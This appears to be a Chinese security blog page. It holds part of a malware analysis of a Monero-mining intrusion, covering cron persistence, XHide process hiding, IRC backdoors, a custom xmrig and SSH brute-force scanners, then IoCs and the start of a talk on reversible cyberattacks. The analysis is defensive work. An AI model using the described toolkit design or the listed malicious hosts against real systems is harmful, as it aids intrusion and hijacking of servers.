+<p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-8.jpg" alt="图-8"><br>经分析，scn中的模块主要实现横向渗透功能。</p>
+<h3 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h3><p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-9.jpg" alt="图-9"><br>恶意程序为当前用户添加了每1分钟执行一次的任务<br><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-10.jpg" alt="图-10"></p>
+<h4 id="httpd文件"><a href="#httpd文件" class="headerlink" title="httpd文件"></a>httpd文件</h4><p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-11.jpg" alt="图-11"><br><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-12.jpg" alt="图-12"></p>
+<p>httpd文件是一个bash脚本文件，主要功能是重启/lib/httpds恶意程序。</p>
+<p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-13.jpg" alt="图-13"></p>
+<p>而/lib/httpds文件不存在，且httpd和后文所述update文件在逻辑结构上相似，此任务应是一个早期版本。</p>
+<h4 id="autorun文件"><a href="#autorun文件" class="headerlink" title="autorun文件"></a>autorun文件</h4><p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-14.jpg" alt="图-14"><br>autorun文件是一个bash脚本文件，主要功能是增加、更新定时任务update，并启动perl后门。</p>
+<h4 id="update文件"><a href="#update文件" class="headerlink" title="update文件"></a>update文件</h4><p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-15.jpg" alt="图-15"><br>update文件是一个bash脚本文件，主要功能是如果进程存在则杀死已有进程后重启/var/tmp/ /.p/run恶意程序。</p>
+<p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-16.jpg" alt="图-16"><br>代码中mech.pid和实际的文件pid名称不对，导致无法杀死已有进程。每分钟执行一次定时任务后，会新建进程，导致系统中恶意进程越来越多。</p>
+<p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-17.jpg" alt="图-17"><br><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-18.jpg" alt="图-18"><br>在/var/opt/.crond/路径下发现相似文件，从创建时间等多种维度来看，变种进化过程如下：</p>
+<ul>
+<li>2019-04-28  /var/opt/.crond/.p/run</li>
+<li>2019-07-22  /var/tmp/ /.p/update</li>
+<li>2019-07-27  /lib/httpd？</li>
+</ul>
+<h3 id="IRC后门"><a href="#IRC后门" class="headerlink" title="IRC后门"></a>IRC后门</h3><p>IRC后门主要存在.p文件夹中，对比2个样本，</p>
+<p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-19.jpg" alt="图-19"><br>主要功能模块没有变化，主要是增加横向扩散功能、更新Perl版本的IRC后门以及改变恶意程序路径。</p>
+<h4 id="run文件"><a href="#run文件" class="headerlink" title="run文件"></a>run文件</h4><p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-20.jpg" alt="图-20"><br>run文件是一个bash脚本文件，主要功能是根据系统的硬件架构执行对应的XHide程序伪装执行python2elf版本的IRC后门，最后执行perl脚本的IRC后门。</p>
+<h4 id="h32-h64文件"><a href="#h32-h64文件" class="headerlink" title="h32\h64文件"></a>h32\h64文件</h4><p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-21.jpg" alt="图-21"><br>h32文件是一个linux/i386版本的XHide程序，<br>h64文件是一个linux//amd64版本的XHide程序，<br>用于进程伪装和隐藏。</p>
+<h4 id="run32-run64文件"><a href="#run32-run64文件" class="headerlink" title="run32\run64文件"></a>run32\run64文件</h4><p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-22.jpg" alt="图-22"></p>
+<p>run32文件是一个linux/i386版本的由pyinstaller生成的ELF文件;<br>Run64文件是一个linux/amd64版本的由pyinstaller生成的ELF文件;</p>
+<p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-23.jpg" alt="图-23"><br><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-24.jpg" alt="图-24"><br><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-25.jpg" alt="图-25"></p>
+<p>经分析其是一个用python语言开发undernetbot，用于使用IRC通道作为C&amp;C的后门程序。</p>
+<h4 id="20文件"><a href="#20文件" class="headerlink" title="..%20文件"></a>..%20文件</h4><p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-26.jpg" alt="图-26"><br>..%20文件是一个源自TeaMrx Perlbot的Perl IRC后门。启动后可以从配置列表中随机选定一个伪装成特定进程，使用从配置列表中随机选定昵称在指定的undernet.org提供的IRC服务频道中接收C&amp;C指令。</p>
+<p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-27.jpg" alt="图-27"><br>通过分析2个样本Perl IRC后门主要更新体现在IRC服务、矿池地址、昵称列表和伪装进程列表方面。</p>
+<h3 id="挖矿模块"><a href="#挖矿模块" class="headerlink" title="挖矿模块"></a>挖矿模块</h3><h4 id="olduser-taz文件"><a href="#olduser-taz文件" class="headerlink" title="olduser.taz文件"></a>olduser.taz文件</h4><p>olduser.taz内有14个文件，主要功能如下：</p>
+<table>
+<thead>
+<tr>
+<th>文件名称</th>
+<th>主要功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>..%20</td>
+<td>Perl版本的IRC后门</td>
+</tr>
+<tr>
+<td>autorun</td>
+<td>增加、更新定时任务并启动update和perl后门</td>
+</tr>
+<tr>
+<td>bte.py</td>
+<td>python版本的加解密、编解码工具</td>
+</tr>
+<tr>
+<td>cfg</td>
+<td>perl后门的配置文件</td>
+</tr>
+<tr>
+<td>cron</td>
+<td>准备添加的定时任务</td>
+</tr>
+<tr>
+<td>cron.d</td>
+<td>默认模板的计划任务，</td>
+</tr>
+<tr>
+<td>dir</td>
+<td>恶意程序存放位置的配置文件</td>
+</tr>
+<tr>
+<td>h32</td>
+<td>32位版本的XHide程序</td>
+</tr>
+<tr>
+<td>h64</td>
+<td>64位版本的XHide程序</td>
+</tr>
+<tr>
+<td>m.dir</td>
+<td>指向/lib/dev的配置文件</td>
+</tr>
+<tr>
+<td>pid</td>
+<td>恶意程序的pid文件</td>
+</tr>
+<tr>
+<td>run</td>
+<td>根据硬件架构选择启动对应run32\run64的shell脚本</td>
+</tr>
+<tr>
+<td>run32</td>
+<td>32位版本的Python IRC后门程序</td>
+</tr>
+<tr>
+<td>run64</td>
+<td>64位版本的Python IRC后门程序</td>
+</tr>
+</tbody></table>
+<h4 id="go文件"><a href="#go文件" class="headerlink" title="go文件"></a>go文件</h4><p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-28.jpg" alt="图-28"><br>go文件是一个bash脚本文件，主要功能是根据系统的硬件架构把对应的ELF程序复制成crond文件并执行，然后执行perl脚本的IRC后门，最后删除恶意文件，并清空历史记录。</p>
+<p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-29.jpg" alt="图-29"></p>
+<h4 id="i686-x86-64-crond文件"><a href="#i686-x86-64-crond文件" class="headerlink" title="i686\x86_64\crond文件"></a>i686\x86_64\crond文件</h4><p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-30.jpg" alt="图-30"><br><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-31.jpg" alt="图-31"></p>
+<p>i686文件是一个经过upx加壳的linux/i386版本的xmrig程序；<br>X86_64\crond文件是一个经过upx加壳的linux/amd64版本的xmrig程序。</p>
+<p>主要功能是门罗币挖矿，其根据xmrig的开源代码做定制开发，用于僵尸网络时，可以指定矿池的静态IP地址，规避DNS解析，以逃避安全检测。</p>
+<h3 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h3><h4 id="scn-db文件"><a href="#scn-db文件" class="headerlink" title="scn.db文件"></a>scn.db文件</h4><p>scn.db内有6个文件，主要功能如下：</p>
+<table>
+<thead>
+<tr>
+<th>文件名称</th>
+<th>主要功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>passfile</td>
+<td>文件中3个文件存放(印度?)常见的账号密码，用于口令暴力破解。</td>
+</tr>
+<tr>
+<td>scanate</td>
+<td>存放一些代理服务器（俄罗斯）。</td>
+</tr>
+<tr>
+<td>201–22</td>
+<td>存放210.212.0.0网段的地址。</td>
+</tr>
+<tr>
+<td>auto</td>
+<td>网段扫描器</td>
+</tr>
+<tr>
+<td>brute</td>
+<td>SSH账号密码暴破工具</td>
+</tr>
+<tr>
+<td>masscan</td>
+<td>Masscan扫描器</td>
+</tr>
+<tr>
+<td>scan</td>
+<td>Legion2000 开发的扫描器,扫描特定网段(如210.212.0.0-210.212.255.255)</td>
+</tr>
+<tr>
+<td>start</td>
+<td>SSH banner爬虫</td>
+</tr>
+<tr>
+<td>vuln.txt</td>
+<td>存放暴破是否成功结果文件</td>
+</tr>
+</tbody></table>
+<h4 id="auto文件"><a href="#auto文件" class="headerlink" title="auto文件"></a>auto文件</h4><p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-32.jpg" alt="图-32"><br>auto文件是一个bash脚本文件，主要功能是根据A段地址生成B网段扫描任务。</p>
+<h4 id="start文件"><a href="#start文件" class="headerlink" title="start文件"></a>start文件</h4><p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-33.jpg" alt="图-33"><br>start文件是一个bash脚本文件，主要功能是根据指定的网段地址和端口，爬取SSH服务地址，并用预置的账号密码文件爆破。</p>
+<h4 id="scan文件"><a href="#scan文件" class="headerlink" title="scan文件"></a>scan文件</h4><p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-34.jpg" alt="图-34"><br>scan文件是一个linux/amd64版本的ELF文件，Legion2000 开发的扫描器，可以扫描指定的网段。</p>
+<h4 id="brute文件"><a href="#brute文件" class="headerlink" title="brute文件"></a>brute文件</h4><p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-35.jpg" alt="图-35"><br>brute文件是一个linux/amd64版本的ELF文件，主要功能是对指定的IP验证预置的SSH账号密码是否能登录成功。</p>
+<h4 id="bte-py文件"><a href="#bte-py文件" class="headerlink" title="bte.py文件"></a>bte.py文件</h4><p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-36.jpg" alt="图-36"><br>bte.py是一个python脚本文件，主要提供使用特定密码的加密、解密方法。</p>
+<h2 id="IoCs"><a href="#IoCs" class="headerlink" title="IoCs"></a>IoCs</h2><h3 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h3><table>
+<thead>
+<tr>
+<th>文件名称</th>
+<th>SHA256</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>x86_64</td>
+<td>d10cb54fe685afdc56f59f1f328276b7027b5367d3dd5131362dd085fef03c7d</td>
+</tr>
+<tr>
+<td>i686</td>
+<td>090e8053cfeb8591e33907c1cb4e6fc1f593623851b2cd0022ef1c1472b4cfa1</td>
+</tr>
+<tr>
+<td>h32</td>
+<td>45ed59d5b27d22567d91a65623d3b7f11726f55b497c383bc2d8d330e5e17161</td>
+</tr>
+<tr>
+<td>h64</td>
+<td>7fe9d6d8b9390020862ca7dc9e69c1e2b676db5898e4bfad51d66250e9af3eaf</td>
+</tr>
+<tr>
+<td>run32</td>
+<td>bc5c36eca38fb2379062a02e2a5f08fe89f73964bfedba38ce301f828d35ab2e</td>
+</tr>
+<tr>
+<td>run64</td>
+<td>e312c04b07209f4e5f98cbc9dbd0b1e495717e2d87ba5d61d4163e2aa02cff52</td>
+</tr>
+<tr>
+<td>olduser.tgz</td>
+<td>cd5166885f266cdb5afa5c780e7375ce11dd2a28fd0605aba4e2cb6f27a4d33a</td>
+</tr>
+<tr>
+<td>scn.db</td>
+<td>7b1070b413f70a00f8b5f0fd480761873367b38dcdee96a6832e1b43a5d0e374</td>
+</tr>
+<tr>
+<td>brute</td>
+<td>3c00611b670b128c1ca6d3c6f0e9522eea385e0670e74a9b2b26325b4e13c864</td>
+</tr>
+<tr>
+<td>masscan</td>
+<td>9aa8a11a52b21035ef7badb3f709fa9aa7e757788ad6100b4086f1c6a18c8ab2</td>
+</tr>
+<tr>
+<td>scan</td>
+<td>60cb56218ecc73cb4262f363c8563aa42a1bff63e5d8b218d79702567b908ae9</td>
+</tr>
+</tbody></table>
+<h3 id="失陷主机"><a href="#失陷主机" class="headerlink" title="失陷主机"></a>失陷主机</h3><p><a href="ftp://153.122.137.67">ftp://153.122.137.67</a><br><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-37.jpg" alt="图-37"></p>
+<h3 id="Domain"><a href="#Domain" class="headerlink" title="Domain"></a>Domain</h3><p>olduser-v4.pwndns.pw</p>
+<h3 id="IRC"><a href="#IRC" class="headerlink" title="IRC"></a>IRC</h3><p>USER zwsiewale xx.xx.xx.xx Bucharest.RO.EU.WeakNet.eu :tupa<br><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-38.jpg" alt="图-38"></p>
+<h2 id="综述"><a href="#综述" class="headerlink" title="综述"></a>综述</h2><p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-39.jpg" alt="图-39"><br>综上所述，此种安全攻击事件以SSH口令爆破为突破口，使用XHide隐藏伪装恶意程序进程、并把境外IRC服务作为C&amp;C，在增加内网SSH弱口令爆破的横向渗透模块后更具危害性。我们提醒企业用户强化SSH口令，使用上文中的IoC检测、清除恶意文件。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://www.stxletto.com/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="stxletto">
+      <meta itemprop="description" content="安全风云波澜壮阔，对酒当歌人间值得。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="深澜深蓝">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/" class="post-title-link" itemprop="url">可逆性网络攻击与防御</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2018-10-28 13:00:00" itemprop="dateCreated datePublished" datetime="2018-10-28T13:00:00+08:00">2018-10-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-05-05 23:26:37" itemprop="dateModified" datetime="2020-05-05T23:26:37+08:00">2020-05-05</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="可逆性网络攻击与防御"><a href="#可逆性网络攻击与防御" class="headerlink" title="可逆性网络攻击与防御"></a>可逆性网络攻击与防御</h1><p>寻龙千万看缠山，一重缠是一重关。攻防对抗有着悠久而形式多样的历史，在网络化的今日也进入了新的领域。网络安全威胁持续蔓延，并可以武器化被有组织的加速扩大，安全问题已经从个人上升到企业层面甚至国家层面。分析利用、调查取证、溯源归因、恢复加固件件都不是轻松的事情。</p>
+<p>有一群穿着格子衫背着双肩包的年轻人，他们中不乏段子手、理论家、操作神，也有文艺青年。他们是普通的开发者，也是这场网络攻防对抗的主角，也会一起分享和探讨安全领域的前沿技术和发展趋势。</p>
+<p>深澜深蓝(stxletto)，在安全行业浸染十余年，多次参与响应网络高危漏洞、国家级会议网络安全保障，拥有丰富的从业经验。其致力于高级威胁识别与缓解方向，曾主导设计并实现了新一代安全产品重要模块，拥有多篇技术发明专利。</p>
+<p>面对组织化、商业化、武器化的安全趋势，stxletto倡议应该尤其注意可逆性网络攻击及防御，提炼先进的模型思想，构建深度分层防御体系。在2018年10月某安全会议中，stxletto做了《可逆性网络攻击与防御》的主题分享，本主题在特朗普废止PPD-20并签署新的美国国家网络战略的时代背景下，从已经发生的网络攻击实际案例中揭示可逆性攻击的趋势、梳理总结网络攻击发起方式。以安全三要素为支点，介绍赛博空间的三类威胁，总结四种潜在的可逆性攻击形式及四大基础应用，最后结合经典的攻击链模型钻石模型，和安全从业者们共同解读一个实际案例中的深度分层体系防御方案。</p>
+<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><h3 id="美国废除-PPD-20"><a href="#美国废除-PPD-20" class="headerlink" title="美国废除 PPD-20"></a>美国废除 PPD-20</h3><p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-1.png" alt="图-1"></p>
+<p>2018年9月20日，美国总统特朗普签署新的国家网络战略。</p>
+<p>这项政策这代替了前总统奥巴马2012年签署的“第20号总统政策指令”（Presidential Policy Directive 20，PPD-20）。“PPD-20”中要求，进攻型行动需要经过美国政府批准。主要目的是控制那些超出日常数字间谍活动或计算机利用行动。如果发起具有重大后果的行动，除了需跨机构小组同意，还需取得总统的批准。</p>
+<h3 id="美国新版国家网络战略"><a href="#美国新版国家网络战略" class="headerlink" title="美国新版国家网络战略"></a>美国新版国家网络战略</h3><p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-2.png" alt="图-2"></p>
+<h4 id="三大特点"><a href="#三大特点" class="headerlink" title="三大特点"></a>三大特点</h4><ul>
+<li>战略对手瞄准中俄；</li>
+<li>战略布局立足构建体系；</li>
+<li>战略目标侧重服务经济。</li>
+</ul>
+<h4 id="四大支柱"><a href="#四大支柱" class="headerlink" title="四大支柱"></a>四大支柱</h4><ul>
+<li>保护美国人民、美国国土和美国生活方式；</li>
+<li>促进美国繁荣；</li>
+<li>以实力维护和平；</li>
+<li>提升美国影响力</li>
+</ul>
+<h4 id="从三个方面进行网络空间博弈"><a href="#从三个方面进行网络空间博弈" class="headerlink" title="从三个方面进行网络空间博弈"></a>从三个方面进行网络空间博弈</h4><p>网络人才招录、网络武器研发、网络战力生成。</p>
+<p>网络战略统领各项网络事务，显示新战略不局限于网络安全方向，必须服务于整体美国国家利益和战略目标  国防基础设施、商业数据、知识产权及公众隐私信息</p>
+<h3 id="传统制裁手段的缺点"><a href="#传统制裁手段的缺点" class="headerlink" title="传统制裁手段的缺点"></a>传统制裁手段的缺点</h3><p>2018年12月6日，华为CFO孟晚舟女士在加拿大转机时，被加拿大当局代表美国政府暂时扣留，美国正在寻求对孟晚舟女士的引渡，面临纽约东区未指明的指控。</p>
+<p>2018年9月20日，美国宣布由于中国军方购买俄罗斯军火，违反了美国2017年颁布的全面制裁法。对中国中央军事委员会装备发展部及其部长李尚福中将实施制裁。</p>
+<p>制裁本质上是公开的，如果它在实施后退缩，会导致主导者的额外声誉成本。</p>
+<h3 id="混合对抗"><a href="#混合对抗" class="headerlink" title="混合对抗"></a>混合对抗</h3><ul>
+<li>政治战</li>
+<li>外交战</li>
+<li>经济战</li>
+<li>舆论战</li>
+<li>心理战</li>
+<li>法律战</li>
+<li>传统战</li>
+<li>网络战</li>
+</ul>
+<h4 id="网络战的优点"><a href="#网络战的优点" class="headerlink" title="网络战的优点"></a>网络战的优点</h4><ul>
+<li>迅速</li>
+<li>隐蔽</li>
+<li>精确</li>
+<li>可控</li>
+<li>可逆</li>
+<li>成本低</li>
+<li>回报高</li>
+<li>攻防兼备</li>
+</ul>
+<h4 id="全面网络战争的缺点"><a href="#全面网络战争的缺点" class="headerlink" title="全面网络战争的缺点"></a>全面网络战争的缺点</h4><ul>
+<li>顾忌对手的网络报复手段</li>
+<li>害怕由网络战引发常规战争</li>
+</ul>
+<h3 id="可逆性网络攻击"><a href="#可逆性网络攻击" class="headerlink" title="可逆性网络攻击"></a>可逆性网络攻击</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>可逆性网络攻击是指不以摧毁对方为目的，选用结果可逆的或攻击停止后可恢复对象功能的技术实现战术目标的对抗过程。</p>
+<h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><ul>
+<li>影响可被缓解、减少和逆转；</li>
+<li>可能以隐蔽的方式进行，使双方更灵活的进退。</li>
+</ul>
